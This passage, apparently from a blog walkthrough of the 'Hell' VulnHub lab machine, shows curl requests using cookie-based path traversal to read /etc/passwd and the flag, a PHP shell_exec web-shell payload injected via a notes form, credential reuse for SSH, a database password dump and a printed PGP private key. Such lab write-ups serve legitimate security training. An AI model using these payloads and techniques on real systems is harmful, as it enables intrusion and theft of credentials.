</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/bin/sh
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
</span><span class='line'>Debian-exim:x:101:104::/var/spool/exim4:/bin/false
</span><span class='line'>statd:x:102:65534::/var/lib/nfs:/bin/false
</span><span class='line'>sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>postgres:x:104:108:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
</span><span class='line'>george:x:1000:1000:george,,,:/home/george:/bin/bash
</span><span class='line'>mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false
</span><span class='line'>jack:x:1001:1001::/home/jack:/bin/sh
</span><span class='line'>milk_4_life:x:1002:1002::/home/milk_4_life:/bin/sh
</span><span class='line'>developers:x:1003:1003::/home/developers:/bin/sh
</span><span class='line'>bazza:x:1004:1004::/home/bazza:/bin/sh
</span><span class='line'>oj:x:1005:1005::/home/oj:/bin/sh
</span><span class='line'>&lt;/HTML&gt;
</span><span class='line'>root@kali:~#
</span></code></pre></td></tr></table></div></figure>


<p>YEAH. That felt pretty darm good! Obviously not knowing all the steps needed to complete this VM, I figured I had come a pretty long way to finding the pot of gold. (Note the users in this file for later) During the enumeration I took a chance to include <code>/root/flag.txt</code>:</p>

<figure class='code'><figcaption><span>Hell</span><a href='http://leonjza.github.io/root/flag.txt`'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# cat cookies
</span><span class='line'><span class="c"># Netscape HTTP Cookie File</span>
</span><span class='line'><span class="c"># http://curl.haxx.se/rfc/cookie_spec.html</span>
</span><span class='line'><span class="c"># This file was generated by libcurl! Edit at your own risk.</span>
</span><span class='line'>
</span><span class='line'>192.168.56.102 FALSE /  FALSE 0  PHPSESSID   8u300rbb0747fi6iocm0lt4310
</span><span class='line'>192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  failcount   4
</span><span class='line'>192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  intruder ....//....//....//....//....//root/flag.txt
</span><span class='line'>
</span><span class='line'>root@kali:~# curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php -c cookies -b cookies
</span><span class='line'>
</span><span class='line'>&lt;HTML&gt;
</span><span class='line'>&lt;CENTRE&gt;
</span><span class='line'>&lt;H2&gt; Folders &lt;/H2&gt;
</span><span class='line'>&lt;TABLE <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;width:700px&quot;</span> <span class="nv">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span>&gt;
</span><span class='line'>&lt;TR&gt;
</span><span class='line'>   &lt;TD&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&quot;server.php&quot;</span>&gt;&lt;IMG <span class="nv">SRC</span><span class="o">=</span><span class="s1">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
</span><span class='line'>   &lt;TD&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&quot;mail.php&quot;</span>&gt;&lt;IMG <span class="nv">SRC</span><span class="o">=</span><span class="s1">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
</span><span class='line'>   &lt;TD&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&quot;users.php&quot;</span>&gt;&lt;IMG <span class="nv">SRC</span><span class="o">=</span><span class="s1">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
</span><span class='line'>   &lt;TD&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&quot;personal.php&quot;</span>&gt;&lt;IMG <span class="nv">SRC</span><span class="o">=</span><span class="s1">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
</span><span class='line'>   &lt;TD&gt;&lt;A <span class="nv">HREF</span><span class="o">=</span><span class="s2">&quot;notes.php&quot;</span>&gt;&lt;IMG <span class="nv">SRC</span><span class="o">=</span><span class="s1">&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
</span><span class='line'>&lt;/TR&gt;
</span><span class='line'>&lt;TR&gt;
</span><span class='line'>   &lt;TD&gt;&lt;H4&gt;Server Status&lt;/H4&gt;&lt;/TD&gt;
</span><span class='line'>   &lt;TD&gt;&lt;H4&gt;Mail Status&lt;/H4&gt;&lt;/TD&gt;
</span><span class='line'>   &lt;TD&gt;&lt;H4&gt;Auth Users&lt;/H4&gt;&lt;/TD&gt;
</span><span class='line'>   &lt;TD&gt;&lt;H4&gt;Personal Folder&lt;/H4&gt;&lt;/TD&gt;
</span><span class='line'>   &lt;TD&gt;&lt;H4&gt;Notes&lt;/H4&gt;&lt;/TD&gt;
</span><span class='line'>&lt;/TR&gt;
</span><span class='line'>&lt;/CENTRE&gt;
</span><span class='line'>Congratulations of beating Hell.
</span><span class='line'>
</span><span class='line'>I hope you enjoyed it and there weren<span class="err">&#39;</span>t to many trolls in here <span class="k">for </span>you.
</span><span class='line'>
</span><span class='line'>Hit me up on irc.freenode.net in <span class="c">#vulnhub with your thoughts (Peleus) or follow me on twitter @0x42424242</span>
</span><span class='line'>
</span><span class='line'>Flag: a95fc0742092c50579afae5965a9787c54f1c641663def1697f394350d03e5a53420635c54fffc47476980343ab99951018fa6f71f030b9986c8ecbfc3a3d5de
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;/HTML&gt;
</span><span class='line'>root@kali:~#
</span></code></pre></td></tr></table></div></figure>


<p>And bingo. <em>Technically</em> we finished what the original goal was, though, re-reading the original entry on Vulnhub, I was almost certain this was not the only way to get to this. Maybe a bug on the original release of the VM? I don&rsquo;t know.
From here on onwards, the goal was no longer to read <code>/root/flag.txt</code>. No, we now have to root this VM :)</p>

<h2>gaining shell</h2>

<p>With the focus slightly shifting, and our ability to read files off the file system, the next natural step was to attempt to get command execution on the VM. Remembering the <code>notes.php</code> file, I decided to try include <code>/tmp/note.txt</code>. This worked just fine and echoed my testing attempts from earlier. So with this information, I simply went back to <code>notes.php</code>, entered: <code>&lt;?php print_r(shell_exec($_GET['c'])); ?&gt;</code>, and submitted the form. Next I edited the cookiejar to include <code>/tmp/notes.txt</code>, and proceeded to test my command execution:</p>

<figure class='code'><figcaption><span>Hell command execution</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php?c<span class="o">=</span>id -c cookies -b cookies
</span><span class='line'><span class="o">[</span>snip<span class="o">]</span>
</span><span class='line'>&lt;/CENTRE&gt;
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'>&lt;/HTML&gt;
</span><span class='line'>root@kali:~#
</span></code></pre></td></tr></table></div></figure>


<p>Yay :) With this confirmed working, I modified the command exec request slightly so that commands with potentially strange characters are correctly encoded etc:</p>

<figure class='code'><figcaption><span>Hell &#8216;better&#8217; command execution</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php?c<span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> -n “ls -lah” <span class="p">|</span> python -c <span class="s2">&quot;import urllib, sys; print urllib.quote(&#39;&#39;.join(sys.stdin));&quot;</span><span class="k">)</span> -c cookies -b cookies
</span></code></pre></td></tr></table></div></figure>


<h2>becoming jack</h2>

<p>With command execution, it was easy to start enumerating as much as possible about the VM. At least as much as the <code>www-data</code> user has access to, which is generally quite a lot.</p>

<p>I looked at the source files for the website out of curiosity about the filtering etc that was going on. I stumbled upon some MySQL credentials in <code>login.php</code>:</p>

<figure class='code'><figcaption><span>MySQL credentials</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="c1">// mysql_connect(&quot;127.0.0.1&quot;, &quot;Jack&quot;, &quot;zgcR6mU6pX&quot;) or die (&quot;Server Error&quot;); I&#39;ll change this back once development is done. Got sick of typing my password.</span>
</span><span class='line'><span class="nb">mysql_connect</span><span class="p">(</span><span class="s2">&quot;127.0.0.1&quot;</span><span class="p">,</span> <span class="s2">&quot;www-data&quot;</span><span class="p">,</span> <span class="s2">&quot;website&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Server Error&quot;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>The comment was quite helpful along with all the mentions of Jack on the website, along with the <code>/etc/passwd</code> revealing a <code>jack</code> user, I tried these credentials on a SSH session:</p>

<figure class='code'><figcaption><span>ssh as jack</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# ssh jack@192.168.56.102
</span><span class='line'>jack@192.168.56.102<span class="err">&#39;</span>s password:
</span><span class='line'>Linux hell 3.2.0-4-486 <span class="c">#1 Debian 3.2.57-3+deb7u2 i686</span>
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
</span><span class='line'>the exact distribution terms <span class="k">for </span>each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>No mail.
</span><span class='line'>Last login: Sun Jul 20 04:29:06 2014 from 192.168.56.1
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>jack<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>jack<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>jack<span class="o">)</span>
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Well that was easy&hellip; With this shell, I also checked out the MySQL database to see if there is any interesting information:</p>

<figure class='code'><figcaption><span>Hell MySQL</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class='mysql'><span class='line'><span class="err">$</span> <span class="n">mysql</span> <span class="o">-</span><span class="n">uwww</span><span class="o">-</span><span class="n">data</span> <span class="o">-</span><span class="n">pwebsite</span>
</span><span class='line'><span class="n">Welcome</span> <span class="k">to</span> <span class="n">the</span> <span class="n">MySQL</span> <span class="n">monitor</span><span class="p">.</span>  <span class="n">Commands</span> <span class="n">end</span> <span class="k">with</span> <span class="p">;</span> <span class="k">or</span> <span class="err">\</span><span class="n">g</span><span class="p">.</span>
</span><span class='line'><span class="n">Your</span> <span class="n">MySQL</span> <span class="n">connection</span> <span class="n">id</span> <span class="k">is</span> <span class="mi">10320</span>
</span><span class='line'><span class="n">Server</span> <span class="n">version</span><span class="p">:</span> <span class="mi">5</span><span class="p">.</span><span class="mi">5</span><span class="p">.</span><span class="mi">37</span><span class="o">-</span><span class="mi">0</span><span class="o">+</span><span class="nf">wheezy1</span> <span class="p">(</span><span class="n">Debian</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="nf">Copyright</span> <span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="mi">2000</span><span class="p">,</span> <span class="mi">2014</span><span class="p">,</span> <span class="n">Oracle</span> <span class="k">and</span><span class="o">/</span><span class="k">or</span> <span class="n">its</span> <span class="n">affiliates</span><span class="p">.</span> <span class="k">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="n">Oracle</span> <span class="k">is</span> <span class="n">a</span> <span class="n">registered</span> <span class="n">trademark</span> <span class="n">of</span> <span class="n">Oracle</span> <span class="n">Corporation</span> <span class="k">and</span><span class="o">/</span><span class="k">or</span> <span class="n">its</span>
</span><span class='line'><span class="n">affiliates</span><span class="p">.</span> <span class="n">Other</span> <span class="n">names</span> <span class="n">may</span> <span class="n">be</span> <span class="n">trademarks</span> <span class="n">of</span> <span class="n">their</span> <span class="n">respective</span>
</span><span class='line'><span class="n">owners</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="n">Type</span> <span class="s1">&#39;help;&#39;</span> <span class="k">or</span> <span class="s1">&#39;\h&#39;</span> <span class="k">for</span> <span class="n">help</span><span class="p">.</span> <span class="n">Type</span> <span class="s1">&#39;\c&#39;</span> <span class="k">to</span> <span class="n">clear</span> <span class="n">the</span> <span class="n">current</span> <span class="n">input</span> <span class="n">statement</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">show</span> <span class="k">databases</span><span class="p">;</span>
</span><span class='line'><span class="o">+--------------------+</span>
</span><span class='line'><span class="o">|</span> <span class="k">Database</span>           <span class="o">|</span>
</span><span class='line'><span class="o">+--------------------+</span>
</span><span class='line'><span class="o">|</span> <span class="n">information_schema</span> <span class="o">|</span>
</span><span class='line'><span class="o">|</span> <span class="n">website</span>            <span class="o">|</span>
</span><span class='line'><span class="o">+--------------------+</span>
</span><span class='line'><span class="mi">2</span> <span class="n">rows</span> <span class="k">in</span> <span class="kt">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">use</span> <span class="n">website</span><span class="p">;</span>
</span><span class='line'><span class="n">Reading</span> <span class="k">table</span> <span class="n">information</span> <span class="k">for</span> <span class="n">completion</span> <span class="n">of</span> <span class="k">table</span> <span class="k">and</span> <span class="k">column</span> <span class="n">names</span>
</span><span class='line'><span class="n">You</span> <span class="n">can</span> <span class="n">turn</span> <span class="n">off</span> <span class="n">this</span> <span class="n">feature</span> <span class="k">to</span> <span class="n">get</span> <span class="n">a</span> <span class="n">quicker</span> <span class="n">startup</span> <span class="k">with</span> <span class="o">-</span><span class="n">A</span>
</span><span class='line'>
</span><span class='line'><span class="k">Database</span> <span class="n">changed</span>
</span><span class='line'><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">show</span> <span class="kp">tables</span><span class="p">;</span>
</span><span class='line'><span class="o">+-------------------+</span>
</span><span class='line'><span class="o">|</span> <span class="n">Tables_in_website</span> <span class="o">|</span>
</span><span class='line'><span class="o">+-------------------+</span>
</span><span class='line'><span class="o">|</span> <span class="n">users</span>             <span class="o">|</span>
</span><span class='line'><span class="o">+-------------------+</span>
</span><span class='line'><span class="mi">1</span> <span class="n">row</span> <span class="k">in</span> <span class="kt">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span><span class="p">;</span>
</span><span class='line'><span class="o">+----------+-----------+</span>
</span><span class='line'><span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>  <span class="o">|</span>
</span><span class='line'><span class="o">+----------+-----------+</span>
</span><span class='line'><span class="o">|</span> <span class="n">Jack</span>     <span class="o">|</span> <span class="n">g0tmi1k69</span> <span class="o">|</span>
</span><span class='line'><span class="o">+----------+-----------+</span>
</span><span class='line'><span class="mi">1</span> <span class="n">row</span> <span class="k">in</span> <span class="kt">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">mysql</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Alrighty. I made a note about the credentials we have associated with &lsquo;Jack&rsquo; so far. I also tested these credentials on the website, just to get a feel of what the site was actually supposed to do :P</p>

<h2>becoming milk_4_life</h2>

<p>Jack had a <code>.pgp</code> folder with a private key stored in hes home directory.</p>

<figure class='code'><figcaption><span>jacks private PGP key</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'>/home/jack/.pgp
</span><span class='line'>
</span><span class='line'><span class="nv">$ </span>ls -lah
</span><span class='line'>total 20K
</span><span class='line'>drwx------ 2 jack jack 4.0K Jun 18 12:35 .
</span><span class='line'>drwx------ 4 jack jack 4.0K Jun 22 18:28 ..
</span><span class='line'>-rwx------ 1 jack jack   39 Jun 18 12:35 note
</span><span class='line'>-rwx------ 1 jack jack 1.8K Jun 18 12:20 pgp.priv
</span><span class='line'>-rwx------ 1 jack jack  890 Jun 18 12:24 pgp.pub
</span><span class='line'>
</span><span class='line'><span class="nv">$ </span>cat pgp.priv
</span><span class='line'>-----BEGIN PGP PRIVATE KEY BLOCK-----
</span><span class='line'>Version: BCPG C# v1.6.1.0
</span><span class='line'>
</span><span class='line'>lQOsBFOg9v8BCACbr++BXlL9e4N6pzcrHkNZGANB7Ii3vHc0Nj37kCm7ZuTMx4LN
</span><span class='line'>bpWrqGb9W9grS9YQ7xSEkBShaKlWMilb4rqrM/tmDyuGt9UozCrVrCTfaZdPl72o
</span><span class='line'>u1QO1DxTT9/iFwlb6AAjTvJGQQx92PQeShEOeTtycH+Xz4tx1ezHpbA4HK9ijftR
</span><span class='line'>lyZy+y9GPSqYLsIU3N8WtnrTJRfSMiU/AGv/GWpykp3tlHjIL0YSHfvUppe4xAil
</span><span class='line'>54J+LN7se3jKuFcRM+i9TF08hsTtM6azl7X4yyEDhHcvWgFY/vyggEwe6/ZP1IKG
</span><span class='line'>zzAWi0sx7tlZLxyr9AFSXLwLvbhUpR3M5rJBABEBAAH/AwMC8ht700SVD+1guMSO
</span><span class='line'>NKMnwLvKkrmW32b/zo/x4g4MbhUs1BXIvHfGw1ArsEpkMucb8utDqGzcwctR00de
</span><span class='line'>jTr/nFo0gKxBMgc34e9HNTI0iFlVYWDFZqU4ie6/Pyt8qvZHOe5Aq0qPsCkcdMME
</span><span class='line'>bR6EQng1ZBXX7zHCF2TobPnIxp5CGI2WUwXmXaGQS/hRriIcAhDx5ZFFqOdVQWES
</span><span class='line'>mLo5Rd205/M4mungbUvwrHayu6ZGume+VXs630YaacNiBFpXnPDfKOCipZ+EhYsz
</span><span class='line'>7febMxXj3mANwLXQfyTZOIXPzMptE11fbDA8jpy9m0vMy5ZCpJnp/VoTaaUxMz45
</span><span class='line'>OeUI9nKTx9P1lGPC9hYidshg3Sg5Iz/qqmL/byAv1bUV2YOdJlAS1XY9Jj/wNrYz
</span><span class='line'>yG9ASw5nfp0ChhLYnnU4dgfEk5bajGvgnhZAlb/+yNvJ5eUcwivjFC8jJUwlrZ+Z
</span><span class='line'>oj1XAC4148JsjcQHW1d7yONc4iI7tSubMNa5GfBal1BxMRLP3nSZ4ICl67gTjrKH
</span><span class='line'>ztiMKAefip3ywnRomfn7q9raJQ8TsKp0+REVy05mhZMZ1AdMlZzhTz8cYy8II6yr
</span><span class='line'>qSxuJARfJ95FGYPrASMfJ+aZfPNk5RDnH5d92vxm/nIWexdayZqqQJG4MzOhtrjx
</span><span class='line'>a0YouqQhxvD2aKslEBJ1S/D4D40xkVI+oaI+aM/6X+XzC2XVJgm7G8FvmtE09BUm
</span><span class='line'>fAMUxE/bgsv33QXsURtelfuoZRLz/OmwybXpwv+Zen0n8hpjQEAOhqD4eieIxH9j
</span><span class='line'>7W6ijInh9XD8jcnUa4eHw7WDa0LPtyQSbPZB1hZou6z8pAZY0LxhmstpPjSYfdKR
</span><span class='line'>HRjhRuu0tdZ2PrKx1wKooo/iiJdZ0Cgizlu4k76rDrQSamFja0Bjb3dsb3ZlcnMu
</span><span class='line'>Y29tiQEcBBABAgAGBQJToPb/AAoJEL26wSU/GKsKnk0H/iWvOGuWwge8VteqxPip
</span><span class='line'>yu2LwvLzjbHAeWwBmsg69h+Yl5l8Y+3B9aoCpnjM2QmMAFHxVA8L6Z4UIyhNJ90Y
</span><span class='line'>l18rYZec9cDUrflowd/A4QVrJNCV/5kCyPeQ03mzGHnlTTvb/qBMymmpVBeP3JoK
</span><span class='line'>vZkGYzFBmrt7q19b3VcvexLTwtLtch8NUOt6719UFRvxE+EXu4JbItr7dSqfYDbh
</span><span class='line'>zHsfGaeU1hCQJg/n83IRxTBsc7h1jIOxraovzbErqpZ6YeYhCK5oo38dJVpz9Daa
</span><span class='line'>quU6lGTizKWX3HS29HQl+PJvzoHyj3T6Aw71BZF4lZNrJmzxHqhVYuRWptioyTWo
</span><span class='line'><span class="nv">tqg</span><span class="o">=</span>
</span><span class='line'><span class="o">=</span>SCkw
</span><span class='line'>-----END PGP PRIVATE KEY BLOCK-----
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>There was also a note in the directory:</p>

<figure class='code'><figcaption><span>Jacks Note</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>cat note
</span><span class='line'>The usual password as with everything.
</span></code></pre></td></tr></table></div></figure>


<p>With all this information now known to us, and the fact that I know PGP is pretty popular to encrypt files and sign mail, I figured we had to get this key loaded and decrypt something using it. Further enumeration revealed that <code>/var/mail</code> was world readable:</p>

<figure class='code'><figcaption><span>Account details:</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'>/var/mail/jack/received
</span><span class='line'><span class="nv">$ </span>ls -lah
</span><span class='line'>total 12K
</span><span class='line'>drwxr-sr-x 2 root mail 4.0K Jun 18 12:26 .
</span><span class='line'>drwxr-sr-x 3 jack jack 4.0K Jul  5 19:56 ..
</span><span class='line'>-rw-r--r-- 1 root mail  709 Jun 18 12:26 message.eml
</span><span class='line'><span class="nv">$ </span>cat message.eml
</span><span class='line'>-----BEGIN PGP MESSAGE-----
</span><span class='line'>Version: BCPG C# v1.6.1.0
</span><span class='line'>
</span><span class='line'>hQEMA726wSU/GKsKAQf/ZnGxyaHQ6wMhSzpbn2J2uVKoPFS3tHdnBzJ18kswBwOm
</span><span class='line'>yff3Joe5RTtMgdjydD+37DSg6SikjcdzJiHV3y5QHqxVcNt5xo0BdYNCWoqjdMzJ
</span><span class='line'>3g50VEwMg5DZwLvTmUr4f+CJ7bc/Cv2hHazKXnT7s71lqBLSCCsNwZuWpxYW1OMX
</span><span class='line'>7CNE92QXayltmQ0GLajIMtzmGlszgwQkVjQ2h9wMGelVYHi5hYsEZzIdh6/9Jo24
</span><span class='line'>rerlq1CY6/T70KsY6GyBoU3iKFgsIkwcb6whrlR/6SCK2vNmLlz2AfDSITYY+6vZ
</span><span class='line'>MWXhiYbZSRyHq7gaYRKS6kzG6uLlsyq4YnQzhz8M+sm4dePDBvs7U6yAPJf4oAAH
</span><span class='line'>9o01Fp3IJ1isvVMH5Fr8MwQjOAuo6Yh6TwbOrI/MVpphJQja8gDKVYr2tlqNS5me
</span><span class='line'>V8xJ7ZUxsh67w/5s5s1JgEDQt+f4wckBc8Dx5k9SbS9iRUbZ0oLJ3IM8cUj3CDoo
</span><span class='line'>svsh0u4ZWj4SrLsEdErcNX6gGihRl/xs3qdVOpXtesSvxEQcWHLqtMY94tb29faD
</span><span class='line'>+oQPjG3V4cSY5r566esUAlCn7ooYyx6Dug<span class="o">==</span>
</span><span class='line'><span class="o">=</span>svWU
</span><span class='line'>-----END PGP MESSAGE-----
</span></code></pre></td></tr></table></div></figure>


<p>I loaded the private GPG key into jacks keyring with:</p>

<figure class='code'><figcaption><span>Loading Jacks private key</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>gpg --import .pgp/pgp.priv
